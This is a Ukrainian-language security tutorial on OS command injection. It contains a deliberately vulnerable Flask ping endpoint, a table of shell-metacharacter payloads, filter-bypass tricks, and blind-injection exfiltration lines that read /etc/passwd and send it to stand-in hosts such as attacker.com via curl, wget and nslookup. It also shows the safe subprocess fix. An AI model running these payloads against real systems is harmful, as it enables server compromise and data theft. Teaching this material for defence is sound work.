Модуль 14 — Command Injection

Дізнайся, як несанітизований ввід, переданий в OS-команди, дозволяє атакуючим виконувати довільні системні команди.

Прямий доступ до операційної системи

SQL injection дає тобі базу даних. XSS дає тобі браузер користувача. А command injection? Command injection дає тобі весь сервер. Коли додаток передає введені користувачем дані в оболонку операційної системи без належної санітизації, атакуючий може виконати будь-яку команду, яку може запускати обліковий запис веб-сервера.

Подумай, що це означає. Атакуючий може прочитати будь-який файл на сервері. Переглянути список процесів. Завантажити та запустити шкідливе ПЗ. Створити нові облікові записи. Переміститися на інші машини у внутрішній мережі. Встановити reverse shell і зберігати постійний доступ ще довго після того, як вразливість буде закрита.

Command injection — один із найсерйозніших класів вразливостей, тому що тут немає пісочниці. SQL injection обмежена тим, що може SQL. XSS обмежена тим, що може JavaScript у браузері. Command injection обмежена тим, що може операційна система — а вона може все.

Як працює command injection

Вразливість виникає щоразу, коли додаток бере введені користувачем дані і включає їх у рядок, який виконується як команда оболонки. Найпоширеніший сценарій — мережеві утиліти: розробники створюють веб-інтерфейс для ping, nslookup, traceroute чи подібних утиліт і передають ввід користувача прямо в shell.

Вразливий код

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # DANGEROUS: user input directly in shell command
    output = os.popen(f'ping -c 1 {host}').read()
    return output

# Normal use: host=8.8.8.8
# Command: ping -c 1 8.8.8.8  (works fine)

# Attack:   host=8.8.8.8; cat /etc/passwd
# Command:  ping -c 1 8.8.8.8; cat /etc/passwd
# The semicolon ends the ping command and starts a new one!

Фундаментальна проблема така сама, як і в SQL injection: оболонка отримує один рядок і не може відрізнити, де закінчується команда розробника і починається ввід користувача. Крапка з комою інтерпретується як роздільник команд, і все, що стоїть після неї, виконується як окрема команда.

Метасимволи shell — арсенал атакуючого

Unix shell має багато спеціальних символів, які керують виконанням команд. Кожен із них — потенційний вектор ін'єкції:

СимволЗначенняПриклад
;Роздільник команд — виконує обидві командиping 8.8.8.8; cat /etc/passwd
|Pipe — передає вивід першої на вхід другоїping 8.8.8.8 | cat /etc/passwd
&&AND — виконує другу тільки якщо перша успішнаping 8.8.8.8 && cat /etc/passwd
||OR — виконує другу тільки якщо перша провалиласьping invalid || cat /etc/passwd
`cmd`Підстановка через backtick — виконує вбудованоping `whoami`.attacker.com
$(cmd)Dollar-підстановка — те саме, що backtickping $(whoami).attacker.com
%0aURL-кодований переведення рядка — починає новий рядокhost=8.8.8.8%0acat+/etc/passwd
> / >>Перенаправлення виводу у файл; id > /app/static/pwned.txt
Windows vs. Linux: У Windows метасимволи трохи відрізняються. Використовуй & замість ; як роздільник команд, а | працює так само. Windows-специфічні пейлоади: & dir, | type C:\windows\win.ini, & whoami.

Безпечний код — без shell

import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # SAFE: pass as a list — no shell interpretation
    # Each element is treated as a separate argument, not parsed by the shell
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True, text=True, timeout=5
    )
    return result.stdout

Ключова різниця: коли ти передаєш список у subprocess.run() без shell=True, аргументи передаються безпосередньо у виконуваний файл ping. Жодна оболонка не задіяна, тому метасимволи shell не мають жодного спеціального значення. Навіть якщо користувач надішле 8.8.8.8; cat /etc/passwd, це буде оброблено як буквальне ім'я хоста (яке не вдасться дозволити, але cat не буде виконано).

Техніки обходу фільтрів

Багато розробників намагаються захиститися від command injection, блокуючи конкретні символи — пробіли, крапки з комою чи pipe. Ці фільтри майже завжди можна обійти. Shell — неймовірно виразна мова з десятками способів зробити одне й те саме: 

# === SPACE BYPASS ===
# $IFS (Internal Field Separator) — default includes space, tab, newline
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Brace expansion — commas act as separators
{cat,/etc/passwd}

# Tab character (hex 0x09)
cat%09/etc/passwd

# === KEYWORD BYPASS ===
# Quote insertion — breaks up blocked words
c''at /etc/passwd
c\at /etc/passwd
ca$()t /etc/passwd

# Variable concatenation
a=c;b=at;$a$b /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# Hex encoding
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Wildcard globbing
cat /etc/pass??
cat /etc/p*wd
Висновок: Блокування символів shell за чорним списком — програшна стратегія. Занадто багато способів обійти будь-який фільтр. Єдиний надійний захист — взагалі не використовувати shell — передавай аргументи списком у subprocess.run() без shell=True. Якщо використання shell абсолютно необхідне, використовуй shlex.quote() у Python для належного екранування вводу.

Blind command injection

Іноді додаток виконує твою команду, але не показує вивід. Сервер може просто показати "Ping complete" або повернути загальне повідомлення про успіх. Ти не бачиш вивід команди, але все одно можеш підтвердити ін'єкцію та витягти дані через побічні канали:

Детекція на основі часу

# If the response takes 5 extra seconds, injection worked
; sleep 5
| sleep 5
`sleep 5`

Out-of-Band (OOB) ексфільтрація даних

# DNS exfiltration — the data appears in your DNS logs
; nslookup $(whoami).your-collaborator-domain.com
; host $(cat /etc/hostname).your-server.com

# HTTP exfiltration — the data arrives as a request to your server
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
; wget http://attacker.com/$(whoami)

Ексфільтрація через запис у файл

# Write output to a publicly accessible file
; cat /app/secret.txt > /app/static/output.txt
# Then browse to http://target.com/static/output.txt
Burp Collaborator / Interactsh: У реальному пентестингу OOB-детекція стає простою завдяки таким інструментам, як Burp Collaborator (вбудований у Burp Suite Pro) або відкритий Interactsh. Ці інструменти дають тобі унікальне доменне ім'я і миттєво повідомляють, коли на нього надходить будь-який DNS або HTTP запит. Це робить виявлення blind command injection надійним і швидким.
Вплив: Command injection дає атакуючим повний доступ на рівні ОС — вони можуть читати файли, встановлювати бекдори, створювати reverse shell, переміщуватися по внутрішніх мережах, ексфільтрувати бази даних, майнити криптовалюту або повністю знищити сервер. Ця вразливість стабільно оцінюється як Critical у програмах bug bounty.
